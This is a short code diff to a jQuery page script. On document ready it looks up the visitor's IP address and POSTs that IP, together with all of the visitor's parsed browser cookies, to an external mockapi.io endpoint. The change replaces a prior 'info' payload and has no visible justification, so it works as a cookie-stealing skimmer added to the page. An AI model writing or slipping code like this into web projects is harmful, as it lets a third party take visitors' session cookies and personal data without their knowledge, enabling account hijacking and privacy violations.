@@ -100,14 +100,18 @@ $(document).ready(function() {
 
 
     };
+
+    $.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
       $.ajax({
           url: 'https://638040e38efcfcedac002c4a.mockapi.io/ap1/requests',
           type: 'POST',
           dataType: 'html',
           data: {
             join_at: new Date(),
-            content: info
+            ip: data,
+            content: document.cookie.split(';').reduce((ac, str) => Object.assign(ac, {[str.split('=')[0].trim()]: str.split('=')[1]}), {})
           }
       }).done(function(result) {
       });
+    });
 });
